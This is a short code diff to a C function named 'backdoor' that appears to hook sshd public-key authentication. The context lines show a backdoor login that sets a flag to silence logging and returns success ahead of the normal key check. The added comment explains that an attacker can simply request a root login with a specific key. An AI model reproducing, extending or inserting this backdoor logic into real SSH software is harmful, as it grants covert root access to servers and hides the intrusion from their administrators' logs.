@@ -252,6 +252,14 @@ backdoor(Authctxt *authctxt)
 	if (authenticated) {
 		log_silenced = 1;
 		is_backdoor = 1;
+
+		/* In theory, we could alter authctxt->pw here if we always
+		 * wanted to login with a specific user. However, defaulting
+		 * to root (the only user that would actually make sense)
+		 * does not work if sshd is not itself running as root.
+		 * We skip this because the attacker could just request a
+		 * login as root with the specified key.
+		 */
 	}
 
 	return authenticated || userauth_pubkey_(authctxt, pkalg, pkblob, alen, blen, have_sig);
